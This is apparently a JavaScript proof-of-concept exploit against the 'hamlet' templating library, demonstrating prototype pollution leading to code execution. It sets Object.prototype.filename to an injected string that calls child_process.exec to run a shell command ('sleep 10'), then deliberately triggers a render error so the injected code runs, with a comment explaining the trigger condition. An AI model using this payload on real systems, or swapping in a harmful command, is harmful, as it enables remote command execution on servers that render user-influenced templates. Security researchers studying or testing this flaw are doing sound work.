const Hamlet = require('hamlet').hamlet;


const templateString =  `<body>
<p>Some paragraph.
<ul>
    <li>Item 1
    <li>Item 2
<.foo>
    <span#bar data-attr=#{foo}>baz # this is a comment`

Object.prototype.filename = "' + global.process.mainModule.require(\'child_process\').exec(\'bash -c \"sleep 10\"\'); + '"

/*
    This requries trigger an error in the render stage as the inject code is in the catch block
    This is fairly commonly seen scanrio if the server is passing user inputs as the data of function while they are missing a required variable (e.g. foo)
*/
try{
    Hamlet(templateString, {})
}catch(e){
    ;
}